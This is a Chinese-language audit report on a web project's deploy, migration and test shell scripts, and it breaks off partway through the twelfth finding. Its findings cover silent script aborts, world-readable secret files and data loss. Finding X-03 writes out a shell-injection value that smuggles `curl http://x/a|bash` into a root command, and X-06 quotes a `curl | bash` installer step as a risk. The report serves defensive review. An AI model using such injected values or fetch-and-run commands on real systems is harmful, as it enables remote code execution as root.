# U14 scripts/deploy/tests（分支归属：master 基线）

## 概述

审计范围：`scripts/`（除 `dev.py` / `stop-dev.bat`）、`deploy/**`、`tests/**`（16 个文件）、`widget-package-examples/**`。全部为 master 基线代码，当前 checkout 为 `feature/contract-watcher`。

审计方式：全部结论均来自 `read`/`grep` 逐行读代码，并交叉核对了 `backend/backend/settings.py`、`backend/apps/widget_packages/views.py`、`frontend/src/components/dashboard/registerCustomWidgets.ts`、`backend/.env.example`、`.gitignore` 以确认后果可达。

**范围结论：`widget-package-examples/**` 未发现真实缺陷，故不予列出。** 已做过的排除性验证：
- 两个 `manifest.json` 的 `type` / `component` / `fieldSlots` 与 `backend/apps/widget_packages/views.py:135-146` 的校验要求一致；
- `progress-bar.zip` 与 `simple-card.zip` 与对应目录源码**逐字节等价**（仅 LF vs CRLF 差异，属打包工具行为，不影响 `script` 标签加载）；
- 两个 `component.js` 均以 `window.__widget_module__` 暴露组件，与 `frontend/src/components/dashboard/registerCustomWidgets.ts:22` 的加载契约一致，无 `eval` / `new Function` / 动态 `innerHTML`。

风险整体分布：部署脚本（`deploy-linux.sh` / `update-from-github.sh`）工程质量明显高于迁移类脚本（`migrate-server.sh` / `quick-sync.sh` / `verify-migration.sh`）；`tests/**` 的 16 个文件中只有 2 个真的连数据库、其余 12 个是无断言打印脚本，且仓库没有任何测试运行器配置。

---

## 缺陷清单

### [P0] X-01 `verify-migration.sh` 计数器自增在 `set -e` 下使脚本静默中止：第 1 项通过后即退出且状态码 0，被误判为"迁移成功"

- 位置：`tests/verify-migration.sh:10`、`tests/verify-migration.sh:22-24`、`tests/verify-migration.sh:39`
- 代码：
```bash
set -euo pipefail
...
check_pass() { echo -e "  ${GREEN}✓${NC} $*"; ((PASS++)); }
check_fail() { echo -e "  ${RED}✗${NC} $*"; ((FAIL++)); }
check_warn() { echo -e "  ${YELLOW}⚠${NC} $*"; ((WARN++)); }
...
    size=$(stat -f%z "$INSTALL_DIR/backend/db.sqlite3" 2>/dev/null || stat -c%s "$INSTALL_DIR/backend/db.sqlite3" 2>/dev/null || echo "0")
    if [[ "$size" -gt 0 ]]; then
        check_pass "数据库文件存在 ($(numfmt --to=iec $size 2>/dev/null || echo "$size bytes"))"
```
- 触发条件：任何一次执行。`PASS` 初值为 `0`，`((PASS++))` 是后自增：整个算术命令的返回值等于**自增前的值** `0`，即退出码 `1`；函数体在 `set -e` 下执行，于是函数返回 1 → 脚本立即 `exit 1`。脚本本身把"文件存在且非空"作为 `[1/5]` 的第一个 `check_pass`，因此第 1 次调用必定命中。
- 后果：脚本在打印第 1 个 `✓` 之后**直接结束**，`[2/5]`~`[5/5]`（服务状态、`/api/health`、`.env` 权限/属主、nginx/systemd 文件）全部不执行，`通过: 0 失败: 0 警告: 0` 的总结也不会打印。运维看到输出首行是绿色 `✓ 数据库文件存在 (...)`、进程退出码 `1`，极易误读为"脚本参数错误"，而不会再去看真正的故障点；更糟的是**任何迁移后的检查失败都不会被报出来**——包括 `curl /api/health` 不通这类核心失败。所有 `set -e` 兜底的"验证脚本"实际退化成"只检查 db.sqlite3 是否存在"。
- 修复建议：
  1) 计数器改为不产生失败返回值的写法，例如 `PASS=$((PASS+1))`（普通赋值，退出码恒为 0），或在三个 `check_*` 函数内显式 `((PASS++)) || true`；
  2) 更稳妥的做法是把计数函数改成 `local` 之外的普通语句并把函数调用统一写成 `check_pass "..." || true`；
  3) 修复后在脚本末加入自检：断言 `PASS+FAIL+WARN >= 13`（当前检查项数量），防止以后再加检查项时再次静默截断。

### [P0] X-02 `migrate-server.sh` 把含全部密钥的 `backend/.env` 推到远端 `/tmp` 且世界可读、无清理

- 位置：`scripts/migrate-server.sh:39`、`scripts/migrate-server.sh:147-152`、`scripts/migrate-server.sh:156-163`、`scripts/migrate-server.sh:215-225`
- 代码：
```bash
BACKUP_DIR="/tmp/gipfel-migration-$(date +%Y%m%d_%H%M%S)"
...
    rsync -avz --progress \
        -e "$RSYNC_SSH" \
        --timeout=300 \
        $extra_opts \
        "$src" "$dst"
...
DATA_ITEMS=(
    "backend/db.sqlite3"          # SQLite 数据库
    "backend/uploads"             # 用户上传文件
    "backend/.env"                # 环境变量配置
```
```bash
    for item in "${DATA_ITEMS[@]}"; do
        src="$INSTALL_DIR/$item"
        if [[ -e "$src" ]]; then
            log_info "同步: $item"
            # 确保目标目录存在
            remote_exec "$REMOTE" "sudo mkdir -p $(dirname $INSTALL_DIR/$item)"
            rsync_transfer "$src" "$REMOTE:$(dirname $INSTALL_DIR/$item)/"
```
- 触发条件：
  1) **pull 模式**（`--mode pull --source user@old`）：`BACKUP_DIR` 默认落在本机 `/tmp/gipfel-migration-<ts>`（第 39 行），`.env` 经 `rsync -avz`（**没有 `-p`，不保留权限**）写入该目录。源端 `.env` 由 `deploy-linux.sh:438` 收紧为 `600`，但 rsync 缺 `-p` 会按 umask（通常 022）新建为 `644`，于是同机任意用户可读。
  2) **push 模式**：`DATA_ITEMS` 明确包含 `backend/.env`，远端目录由远端 root 的 `sudo mkdir -p` 创建（umask 022 → `755`），同样得到世界可读的 `.env`。
- 后果：`backend/.env` 里含 `JWT_SECRET`（可伪造任意用户 JWT，见 `backend/apps/auth/authentication.py:63`）、`DJANGO_SECRET_KEY`（可伪造 session/CSRF）、`LOGVIEWER_SECRET_KEY`（可自签日志查看器/`/admin` 防直连令牌）。这些密钥以 `644` 明文落在 `/tmp` 下、且脚本**没有任何清理逻辑**（`quick-sync.sh` 同理，`--backup-dir` 只改路径不改权限与清理）。同一台机器上任何本地用户（共享构建机、被入侵的低权进程）读一次即完成对生产系统的完全接管；迁移中途失败时该目录会长期残留。push 模式更严重：目标机 `755` 的目录里放着 `644` 的密钥文件，同机任意用户可读，而目标机正是"新生产服务器"。
- 修复建议：
  1) 给 `rsync` 增加 `-p`（并显式 `--chmod=F600` 处理 `.env`），或在传输后立即 `chmod 600`；
  2) 迁移结束（含失败路径）用 `trap 'rm -rf "$BACKUP_DIR"' EXIT` 清理，改为 `BACKUP_DIR="$(mktemp -d)"`（mktemp 自带 700）；
  3) 更根本的做法是不迁移 `.env`：改为在新机首次部署时由 `deploy-linux.sh` 生成新密钥，仅人工核对需保留的业务配置项。

### [P0] X-03 `migrate-server.sh` 变量未加引号，远端以 root 执行时可被 `--install-dir` 注入任意命令

- 位置：`scripts/migrate-server.sh:109-114`、`scripts/migrate-server.sh:211`、`scripts/migrate-server.sh:220`、`scripts/migrate-server.sh:238-242`
- 代码：
```bash
SSH_OPTS="-p $SSH_PORT -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10"
if [[ -n "$SSH_KEY" ]]; then
    SSH_OPTS="$SSH_OPTS -i $SSH_KEY"
fi

RSYNC_SSH="ssh $SSH_OPTS"
```
```bash
    remote_exec "$REMOTE" "sudo mkdir -p $INSTALL_DIR/backend $INSTALL_DIR/frontend-dist"
```
```bash
            remote_exec "$REMOTE" "sudo mkdir -p $(dirname $INSTALL_DIR/$item)"
            rsync_transfer "$src" "$REMOTE:$(dirname $INSTALL_DIR/$item)/"
```
```bash
    remote_exec "$REMOTE" "
        sudo chown -R gipfel:gipfel $INSTALL_DIR/backend 2>/dev/null || true
        sudo chmod 600 $INSTALL_DIR/backend/.env 2>/dev/null || true
        sudo chmod 755 $INSTALL_DIR/backend/uploads 2>/dev/null || true
    "
```
- 触发条件：`--install-dir` 的值被拼进**双引号字符串**后整体交给 `ssh` 的远端 shell 解析，`$INSTALL_DIR` 本身未加引号也无任何白名单校验。两种输入会出错：
  1) 含空格：`sudo bash scripts/migrate-server.sh --mode push --target root@h --install-dir "/opt/my app"` → 远端执行的是 `sudo mkdir -p /opt/my app/backend`，创建出 `/opt/my`、`app/backend` 两个错误目录（在 `dirname` 场景下更进一步错位），随后 rsync 全部落到错误路径，脚本却继续报告"同步完成"。
  2) 含 shell 元字符：`--install-dir '/opt/gipfel;curl http://x/a|bash'` → 远端以 **root** 执行 `sudo mkdir -p /opt/gipfel;curl ...|bash`。第 4/5/6 步的 `remote_exec` 与第 220 行 `$(dirname ...)` 都是同一个模式。
- 后果：脚本按文档要求以 `sudo` 运行（`deploy/README.md:293-296`），远端目标机是待接管的生产机；一个从工单/复制粘贴来的 `--install-dir` 值即可在目标机 root shell 里执行任意命令。这是脚本自身唯一"以 root 拼字符串"的注入面，而其余部署脚本（`deploy-linux.sh`）在同一位置全部使用了引号。
- 修复建议：
  1) 所有 `remote_exec` 调用改成远端单引号包裹 + 传参形式，例如 `ssh ... "$REMOTE" sudo mkdir -p "'$INSTALL_DIR/backend'"`，或统一改用 `printf '%q'` 转义（`printf -v safe '%q' "$INSTALL_DIR"`）；
  2) 参数解析处对 `INSTALL_DIR` 做绝对路径白名单校验：`[[ "$INSTALL_DIR" =~ ^/[A-Za-z0-9._/-]+$ ]] || log_error ...`；
  3) `SSH_OPTS` 改为 bash 数组（`SSH_OPTS=(-p "$SSH_PORT" ...)`），避免 `--ssh-key "/home/me/my key"` 因分词被拆成两个参数。

### [P1] X-04 `migrate-server.sh` 恢复数据库用 `cp ... 2>/dev/null || true` 吞掉失败，随后仍打印"拉取完成"，可静默丢库

- 位置：`scripts/migrate-server.sh:358-367`、`scripts/migrate-server.sh:389-392`
- 代码：
```bash
        # 恢复数据
        cp -a "$BACKUP_DIR/backend/db.sqlite3" "$INSTALL_DIR/backend/" 2>/dev/null || true
        cp -a "$BACKUP_DIR/backend/.env" "$INSTALL_DIR/backend/" 2>/dev/null || true
        cp -a "$BACKUP_DIR/backend/uploads" "$INSTALL_DIR/backend/" 2>/dev/null || true
        cp -a "$BACKUP_DIR/backend/logs" "$INSTALL_DIR/backend/" 2>/dev/null || true
        cp -a "$BACKUP_DIR/backend/staticfiles" "$INSTALL_DIR/backend/" 2>/dev/null || true
        cp -a "$BACKUP_DIR/frontend-dist" "$INSTALL_DIR/" 2>/dev/null || true
        cp -a "$BACKUP_DIR/deploy" "$INSTALL_DIR/" 2>/dev/null || true
```
```bash
    log_info "=========================================="
    log_info "拉取完成！数据已恢复到: $INSTALL_DIR"
    log_info "备份保存在: $BACKUP_DIR"
```
- 触发条件：`--mode pull` 时，若某一步 rsync 拉取失败（磁盘满、`/tmp` 空间不足、`db.sqlite3` 在源端被 `--exclude` 之外的原因跳过、路径不匹配），`$BACKUP_DIR/backend/db.sqlite3` 不存在或为空；`cp` 报错被 `2>/dev/null || true` 吞掉，脚本继续走到收尾并打印"数据已恢复"。
- 后果：新机 `$INSTALL_DIR/backend/` 下**没有 db.sqlite3**，后端启动后 Django 会自动新建一个空库并 `migrate`，表现为"迁移成功但所有比赛/用户/订单数据消失"。因为脚本明确宣称"迁移内容：数据库"，运维很可能在此刻删除旧服务器，造成不可逆数据丢失。注意第 354-356 行"备份现有数据"用的也是同一套 `|| true`，所以本机原有数据也可能静默未被备份。
- 修复建议：
  1) 恢复阶段对每个 `cp` 显式校验：`cp -a ... || log_error "恢复 db.sqlite3 失败"`（去掉 `|| true`），或在恢复后 `[[ -s "$INSTALL_DIR/backend/db.sqlite3" ]] || { log_error "数据库缺失，中止"; exit 1; }`；
  2) 收尾输出改为按事实报告（列出实际恢复成功的条目），失败时以非 0 退出码结束；
  3) 拉取阶段对 `db.sqlite3` 增加大小/非空校验，并在恢复前用 `sqlite3 ... 'PRAGMA integrity_check'` 或至少 `head -c 16` 校验 SQLite 文件头。

### [P1] X-05 `quick-sync.sh` 在服务运行中直接 rsync 活库 `db.sqlite3`（无 WAL/SHM、无锁、无停服），可造成目标库损坏

- 位置：`scripts/quick-sync.sh:43-49`、`scripts/quick-sync.sh:57-77`
- 代码：
```bash
# 同步的数据列表
SYNC_ITEMS=(
    "backend/db.sqlite3"
    "backend/uploads/"
    "backend/.env"
    "backend/logs/"
)
...
for item in "${SYNC_ITEMS[@]}"; do
    src="$INSTALL_DIR/$item"
    dst="$INSTALL_DIR/$(dirname "$item")/"

    if [[ "$ACTION" == "push" ]]; then
        if [[ -e "$src" ]]; then
            log_info "推送: $item"
            rsync -avz --progress -e "ssh -o StrictHostKeyChecking=accept-new" "$src" "$REMOTE:$dst"
```
- 触发条件：脚本对 `backend/db.sqlite3` 做**单文件**同步，不含 `db.sqlite3-wal` / `db.sqlite3-shm`；`deploy/README.md:301-305` 只说明"仅同步数据"，未要求先停服，脚本自身也没有任何 `systemctl stop` / 锁 / `PRAGMA wal_checkpoint` 步骤。只要同步时源端 Django（`gipfel.service`，`Restart=always`）正在写入，就会命中。
- 后果：SQLite 的 WAL 模式下已提交事务可能只存在于 `-wal` 文件中，单拷贝主库文件会得到**逻辑不一致甚至无法打开的库**；若正在 checkpoint，还可能拷到半个页。推送到目标机后 `gipfel.service` 启动即报 `database disk image is malformed`，而源端原库完好，运维容易误判为"磁盘故障"去重建数据。`quick-sync.sh` 同时同步 `.env` 而不重启服务，目标进程仍持有旧密钥（`JWT_SECRET` 变更后旧 token 全部失效/新签发的不被校验），与 `deploy-linux.sh` 的"改配置必重启"约定不一致。
- 修复建议：
  1) 同步前校验/落地一致性：`ssh "$REMOTE" 'sudo systemctl stop gipfel gipfel-logviewer'` → 源端 `python manage.py shell -c "..."` 或 `sqlite3 db.sqlite3 'PRAGMA wal_checkpoint(TRUNCATE)'` → 再同步 → 目标端 `systemctl start`；用 `trap` 保证异常时也恢复服务；
  2) 或改用 SQLite 官方备份接口（`.backup` / `VACUUM INTO`）生成快照文件后再传，并在目标端做 `PRAGMA integrity_check`；
  3) 在文档与脚本输出中明确"本脚本不停服，仅适用于已停服窗口"，并拒绝在 `systemctl is-active gipfel` 为真时静默继续。

### [P1] X-06 `deploy-linux.sh` 以 root 执行 `curl | bash` 安装 NodeSource，无校验、无固定版本

- 位置：`scripts/deploy-linux.sh:144-154`
- 代码：
```bash
    apt-get update -y
    apt-get install -y \
        python3 python3-venv python3-dev python3-pip \
        curl ca-certificates gnupg lsb-release \
        nginx openssl rsync

    # NodeSource 20 LTS（apt 默认 node 太老）
    if ! command -v node >/dev/null 2>&1 || [[ "$(node -v | cut -d. -f1 | tr -d v)" -lt 18 ]]; then
        curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
        apt-get install -y nodejs
    fi
```
- 触发条件：目标机未装 Node 或版本 < 18，且 `https://deb.nodesource.com/setup_20.x` 被 DNS 劫持/中间人劫持/上游内容变更时。`curl -fsSL` 只保证 HTTP 层成功，**不做 GPG 校验、不比对哈希、不固定 commit**，管道右边是 `bash -`（以 root 身份，脚本本身在 `sudo` 下运行）。
- 后果：`setup_20.x` 是浮动别名（官方会随 20.x 演进覆盖同一 URL），任何能影响该 HTTPS 响应的一方（企业 TLS 中间盒、被污染的 DNS+自签证书环境、上游账户被入侵）都能在部署机上以 root 执行任意代码，且这是**一键部署脚本每次执行都会走到的路径**。配合 `deploy/README.md:38-44` 推荐在受限网络下使用 `ghproxy` 类第三方镜像调整 git，整体供应链信任面较大。
- 修复建议：
  1) 改用 apt 官方仓库并校验签名：下载 `https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key` 后用 `gpg --dearmor` 落地到 `/usr/share/keyrings/`，`sources.list.d` 中显式 `signed-by=`，全程不使用管道执行；
  2) 若必须用 setup 脚本，则先 `curl -fsSL -o /tmp/ns.sh`，比对发布方公布的 SHA256，`gpg --verify` 后再 `bash /tmp/ns.sh`；
  3) 至少把下载与执行分离并打印哈希，便于事后审计。

### [P1] X-07 `update-from-github.sh` 把 `git pull` 失败降级为 WARN 后继续，可能"旧代码 + 新数据库结构 + 新前端"并对外服务

- 位置：`scripts/update-from-github.sh:126-140`、`scripts/update-from-github.sh:226-253`、`scripts/update-from-github.sh:432-441`
- 代码：
```bash
_pull_failed_hint() {
    warn "git pull 失败（多为服务器访问 GitHub 的网络抖动/被墙）。已降级为使用本地现有代码继续更新。"
    warn "注意：现有代码可能不是最新！可稍后重试，或配置镜像后重跑："
...
if [[ -d "$INSTALL_DIR/.git" ]]; then
    # 模式 A：部署目录本身是 clone → 原地 pull
    log "部署目录 $INSTALL_DIR 为 git 仓库，原地拉取最新"
    cd "$INSTALL_DIR"
    if ! git pull --ff-only; then
        _pull_failed_hint
    fi
```
```bash
".venv/bin/python" manage.py migrate --noinput
...
npm run build
rm -rf "$INSTALL_DIR/frontend-dist"
```
```bash
refresh_unit "$INSTALL_DIR/deploy/gipfel.service" gipfel.service || UNIT_REFRESH_FAILED=1
refresh_unit "$INSTALL_DIR/deploy/logviewer.service" gipfel-logviewer.service || UNIT_REFRESH_FAILED=1
systemctl daemon-reload
```
- 触发条件：服务器访问 GitHub 抖动/被墙（脚本注释自述为常见场景），`git pull --ff-only` 失败但工作区处于"上一次半途更新"的状态——例如上次 `pull` 已更新 `backend/` 与 `migrations/` 而 `npm run build` 或 `pip install` 失败退出；本次重跑时 pull 再次失败，脚本从第 186 行继续。
- 后果：`migrate` 会以**当前磁盘上的**迁移文件改写生产库结构，`frontend-dist` 会被本次 `npm run build` 覆盖，而 `deploy/*.service`、`scripts/` 可能是旧版本；随后脚本无条件 `systemctl restart gipfel`（第 439-441 行）。最危险的一类组合：新迁移已应用 + 旧 Python 代码仍在跑 → 字段/表不匹配导致 500；或新前端 bundle 调用旧后端缺失的接口。脚本仅用 `warn` 提示"可能不是最新"，把"代码一致性"从硬保证降级成人工注意力，而升级脚本恰恰是无人值守执行的。
- 修复建议：
  1) `--ff-only` 失败即中止（或要求显式 `--allow-stale-code` 才降级），至少要在继续前记录并校验 `git rev-parse HEAD` 与远端 `FETCH_HEAD` 的差异；
  2) 升级前记录 `git rev-parse HEAD`，收尾时再次核对，不一致则拒绝重启并输出诊断；
  3) 把 `deploy/*.service`、`scripts/`、`backend/`、`frontend/` 视为一个原子单元：任一步失败即停在"未重启"状态（当前 `UNIT_REFRESH_FAILED` 已实现这个思路，应扩展到 pull/migrate/build）。

### [P1] X-08 `update-from-github.sh` 把日志查看器公网端口硬编码为 8120，与 `deploy-linux.sh` 依 `LOG_VIEWER_PORT` 生成的 nginx 监听口不一致，并叠加不可达的 ufw 规则

- 位置：`scripts/update-from-github.sh:289-294`、`scripts/update-from-github.sh:563-569`
- 代码：
```bash
            if grep -q '^LOG_VIEWER_PUBLIC_URL=' "$INSTALL_DIR/backend/.env"; then
                if [[ "$LV_PUBLIC_IP" == *:* && "$LV_PUBLIC_IP" != \[* ]]; then
                    sed -i -E "s|^LOG_VIEWER_PUBLIC_URL=.*|LOG_VIEWER_PUBLIC_URL=http://[${LV_PUBLIC_IP}]:8120/|" "$INSTALL_DIR/backend/.env"
                else
                    sed -i -E "s|^LOG_VIEWER_PUBLIC_URL=.*|LOG_VIEWER_PUBLIC_URL=http://${LV_PUBLIC_IP}:8120/|" "$INSTALL_DIR/backend/.env"
                fi
            else
                echo "LOG_VIEWER_PUBLIC_URL=http://${LV_PUBLIC_IP}:8120/" >> "$INSTALL_DIR/backend/.env"
```
```bash
    if [[ -z "$DOMAIN" ]]; then
        if command -v ufw >/dev/null 2>&1; then
            ufw allow 8120/tcp >/dev/null 2>&1 || true
            ok "已放行防火墙 8120 端口（ufw 规则已添加；若 ufw 未启用则该规则暂未生效）"
```
- 触发条件：`.env` 中把 `LOG_VIEWER_PORT` 改成非 8120（`backend/.env.example:69-75` 明确说明该值可由运维修改且"1-65535"合法），随后执行 `update-from-github.sh --with-nginx`。同一脚本第 485-497 行**已经**从 `.env` 正确读出 `_lv_port` 并渲染进 nginx `listen`（说明作者知道该端口是可变配置），但写 `LOG_VIEWER_PUBLIC_URL` 与 `ufw` 的三处（289/291/294）以及 565/568 行仍写死 8120。
- 后果：三处不一致同时出现：① nginx 实际监听 `:9000`（举例），② `.env` 的 `LOG_VIEWER_PUBLIC_URL` 仍是 `http://<IP>:8120/`，③ ufw 放行的是 `8120`。于是前端「系统设置 → 日志查看器」按钮跳向 `:8120` → 连接被拒/超时；运维按提示去查防火墙会看到"8120 已放行"，排查方向被误导；真正监听的 9000 端口既没被放行也没被写入 URL。首次部署用 `deploy-linux.sh` 时行为正确（`${LV_PORT}`），只有升级路径会把它改回错误值——典型的"升级后功能回退"。
- 修复建议：
  1) 把 `deploy-linux.sh:104-116` 的 `_log_viewer_port()` 抽成 `scripts/lib/deploy-common.sh`，两个脚本 source 同一实现，`LOG_VIEWER_PUBLIC_URL` / `ufw` / nginx 渲染全部使用同一个 `LV_PORT`；
  2) `ufw` 段与 `deploy-linux.sh:594-597` 一样先 `ufw delete allow 8120/tcp`（清理历史规则）再放行实际端口，避免残留规则；
  3) 增加自检：渲染完成后比对 `grep '^LOG_VIEWER_PUBLIC_URL=' .env` 的端口与 nginx `listen` 端口，不一致直接 `err`。

### [P1] X-09 `verify-migration.sh` 的"验证"只测文件大小，无法发现损坏/空 schema 的数据库，且漏检日志查看器服务

- 位置：`tests/verify-migration.sh:37-46`、`tests/verify-migration.sh:72-88`、`tests/verify-migration.sh:134-144`
- 代码：
```bash
if [[ -f "$INSTALL_DIR/backend/db.sqlite3" ]]; then
    size=$(stat -f%z "$INSTALL_DIR/backend/db.sqlite3" 2>/dev/null || stat -c%s "$INSTALL_DIR/backend/db.sqlite3" 2>/dev/null || echo "0")
    if [[ "$size" -gt 0 ]]; then
        check_pass "数据库文件存在 ($(numfmt --to=iec $size 2>/dev/null || echo "$size bytes"))"
    else
        check_fail "数据库文件为空"
    fi
else
    check_fail "数据库文件不存在: $INSTALL_DIR/backend/db.sqlite3"
fi
```
```bash
if systemctl is-active --quiet gipfel 2>/dev/null; then
    check_pass "gipfel 服务运行中"
...
if systemctl is-active --quiet gipfel-logviewer 2>/dev/null; then
    check_pass "gipfel-logviewer 服务运行中"
```
- 触发条件：迁移过程中 `db.sqlite3` 被压缩/截断/半拷贝（正是 X-05 场景），但文件长度仍 > 0（例如只拷到 4KB 首页，或只拷了主库而丢了 `-wal`）。脚本对数据库的**唯一**判据是"字节数 > 0"。
- 后果：验证脚本对最关键的资产（业务数据库）给出绿色 `✓ 数据库文件存在 (1.2M)`，运维据此判定"迁移成功"并可安全下线旧机；实际上库可能是 malformed 或缺少最后若干事务。其余检查项（服务/HTTP/权限）此时也会通过，因为 Django 若还没被启动、或空库里 `migrate` 成功过，服务一样是 active。同时脚本只检查 `gipfel` 与 `gipfel-logviewer`、nginx，**不检查**日志查看器真实的 `127.0.0.1:8121` 与 nginx 公网 `LOG_VIEWER_PORT`（`deploy/logviewer.service:21-26`、`deploy/nginx-gipfel.conf:242`），也不检查 `frontend-dist/index.html` 内容，因此"日志查看器 502/跳转打不开"这类最常见的迁移后故障不会被本脚本报出。
- 修复建议：
  1) 增加数据库完整性校验：`sqlite3 "$db" 'PRAGMA integrity_check;'` 必须返回 `ok`，并统计关键表行数（如 `SELECT count(*) FROM users_user`）与源端比对；
  2) 增加日志查看器探针：`curl -s -o /dev/null -w '%{http_code}' -H "Host: 127.0.0.1" http://127.0.0.1:8121/` 期望 302/200（参考 `tests/gipfel-logviewer-diag.sh:22-26` 已有的做法），以及 `curl -I http://127.0.0.1:${LOG_VIEWER_PORT}/`；
  3) 所有 `curl` 补 `--max-time`（见 X-19）。

### [P1] X-10 部署/升级脚本无回滚路径、无失败陷阱：`migrate` 之后任何一步失败都会留下"新库结构 + 旧代码 + 服务停摆"的状态

- 位置：`scripts/deploy-linux.sh:172-190`、`scripts/deploy-linux.sh:407-417`、`scripts/update-from-github.sh:188-195`
- 代码：
```bash
if [[ -d "$INSTALL_DIR/backend" && -f "$INSTALL_DIR/backend/db.sqlite3" ]]; then
    log "发现现有部署 → 备份到 $BACKUP_DIR"
    mkdir -p "$BACKUP_DIR"
    cp -a "$INSTALL_DIR/backend/db.sqlite3" "$BACKUP_DIR/" 2>/dev/null || true
    cp -a "$INSTALL_DIR/backend/uploads"    "$BACKUP_DIR/" 2>/dev/null || true
    cp -a "$INSTALL_DIR/backend/.env"       "$BACKUP_DIR/" 2>/dev/null || true
fi
```
```bash
log "执行 migrate（首次会自动建 admin，密码自动生成或取自 .env SEED_ADMIN_PASSWORD）"
".venv/bin/python" manage.py check --fail-level ERROR
".venv/bin/python" manage.py migrate --noinput
".venv/bin/python" manage.py collectstatic --noinput
```
- 触发条件：`deploy-linux.sh` 的第 184-190 行 `rsync -a --delete` **在校验与备份之后立即用新源码覆盖目标机代码**，备份只含 `db.sqlite3` / `uploads` / `.env`（不含旧代码、不含旧 `frontend-dist`）。此后 `pip install` 失败、`migrate` 中途报错、`npm run build` 失败、`systemctl` 起不来（任一步在 `set -e` 下退出）都会停在半途。
- 后果：目标机代码已是新版（且旧版无副本），数据库可能已被 `migrate` 部分修改（Django 逐个迁移提交）。运维唯一的"回滚"依据是脚本最后一句 `warn "可用备份 $BACKUP_DIR 回滚"`，而该备份**无法回滚代码**；`deploy/README.md:232-238` 的"回滚"章节也只示范了 `cp _backup/<ts>/db.sqlite3`。结果是最常见的生产事故形态：想回退到上一版，手上只有上一版的数据、没有上一版的代码。同时脚本全程无 `trap`，中途 Ctrl+C 或 SSH 断线会留下"服务已被 stop/正在重启"的中间态。
- 修复建议：
  1) 备份阶段一并保存可回滚的代码：`rsync -a --delete "$INSTALL_DIR/backend/" "$BACKUP_DIR/backend/"`（或至少 `git -C "$INSTALL_DIR" rev-parse HEAD` + `git bundle`），并记录本次部署的 commit；
  2) 用 `trap 'on_error' ERR INT TERM` 在失败时输出精确的回滚命令序列（含 `systemctl` 与代码目录），并在升级前 `systemctl stop gipfel`、成功后再 `start`，避免"新版代码 + 半迁移库"对外服务；
  3) 在升级前用 `manage.py makemigrations --check --dry-run` 与 `showmigrations` 预检，失败则根本不进入 `migrate`。

### [P2] X-11 `deploy-linux.sh` 与 `update-from-github.sh` 的 `sed` 追加块在重跑时会重复写入/自我包裹，破坏 `.env`

- 位置：`scripts/deploy-linux.sh:377-386`、`scripts/update-from-github.sh:343-352`
- 代码：
```bash
    if [[ -n "$AH_ENTRY" ]]; then
        if grep -q '^DJANGO_ALLOWED_HOSTS=' "$INSTALL_DIR/backend/.env"; then
            if ! grep -E "^DJANGO_ALLOWED_HOSTS=" "$INSTALL_DIR/backend/.env" | grep -qE "(^|,)${AH_ENTRY}(,|$)"; then
                sed -i "s|^DJANGO_ALLOWED_HOSTS=.*|&,${AH_ENTRY}|" "$INSTALL_DIR/backend/.env"
                ok "DJANGO_ALLOWED_HOSTS 已追加公网入口：${AH_ENTRY}"
            fi
        else
            echo "DJANGO_ALLOWED_HOSTS=${AH_ENTRY},localhost,127.0.0.1" >> "$INSTALL_DIR/backend/.env"
```
- 触发条件：`sed -i "s|^DJANGO_ALLOWED_HOSTS=.*|&,${AH_ENTRY}|"` 中的 `&` 代表**整个匹配文本**。当探测到的公网 IP 发生变化（例如多台出口 IP 的 NAT、云厂商浮动 IP、探测服务返回 `1.2.3.4\n` 之外的形态）时，第一次追加会写入 `...,1.2.3.4`；第二次以新 IP 进入时，正则 `(^|,)1.2.3.5(,|$)` 不匹配，于是再次追加——这一次 `&` 匹配的是**已包含逗号和新值的整行**。若该行结尾仍有非匹配内容（例如用户手工把 `DJANGO_ALLOWED_HOSTS` 排在其他变量后并留了注释），`sed` 的 `.*` 会把注释一并吞掉。
- 后果：`.env` 中 `DJANGO_ALLOWED_HOSTS` 被反复加长，历史公网 IP 永久保留在白名单里（安全上等于扩大 Host 白名单，见 `settings.py:83-94` 的白名单即 Host 校验来源）；`LOG_VIEWER_PUBLIC_URL` 的自愈块（`deploy-linux.sh:327-335`）用同样的 `sed` 语义重写整行，若同一变量在 `.env` 中出现多次（追加式写法很容易造成），`sed` 会同时改写多行，`settings.py` 读到的是 `os.environ` 里**第一次**出现的值，与脚本输出不符，排查时极具误导性。
- 修复建议：
  1) 追加改为先精确读取现值再整体重写：`cur=$(grep -E '^DJANGO_ALLOWED_HOSTS=' .env | head -1 | cut -d= -f2-)` → 用 bash 数组去重拼接 → 用 `awk`/`sed` 以**固定新值**替换（不用 `&`）；
  2) 重写变量时统一 `sed -i -E '/^DJANGO_ALLOWED_HOSTS=/d'` 删除全部同名行，再追加唯一一行，保证 `.env` 中该键只有一条；
  3) 追加/重写后立刻回读并断言只剩一条。

### [P2] X-12 `gen_logviewer_key.py` 在 `.env` 为 GBK/含 BOM 时直接崩溃，导致 Windows 首次 bootstrap 半途而废

- 位置：`scripts/gen_logviewer_key.py:21-42`
- 代码：
```python
    if not os.path.exists(ENV_PATH):
        print("[ERROR] missing " + ENV_PATH + " (copy .env.example first)")
        return 1
    with io.open(ENV_PATH, "r", encoding="utf-8") as f:
        src = f.read()
    m = re.search(r"(?m)^LOGVIEWER_SECRET_KEY=(.*)$", src)
    current = (m.group(1) if m else "").strip().strip('"').strip("'")
    if current:
        print("[OK]    LOGVIEWER_SECRET_KEY already set")
        return 0
    new_key = base64.b64encode(os.urandom(32)).decode("ascii")
```
- 触发条件：Windows 用户按 `.env.example` 顶部注释用记事本/其他编辑器直接新建或另存 `backend/.env`。`docstring` 自述"ASCII-only console output for Windows codepage safety"，说明作者明确关注 Windows 编码，但**读取侧写死了 `encoding="utf-8"`**：`.env` 是 GBK 保存时 `f.read()` 抛 `UnicodeDecodeError`；`.env` 带 UTF-8 BOM 时正则 `^LOGVIEWER_SECRET_KEY=` 因行首多了 `\ufeff` 而匹配不到，脚本会把新键**追加**到文件末尾（`src += line`），于是文件里出现两条该键，`settings.py`/`logviewer/settings.py` 读到的是前面那条（仍为空）。
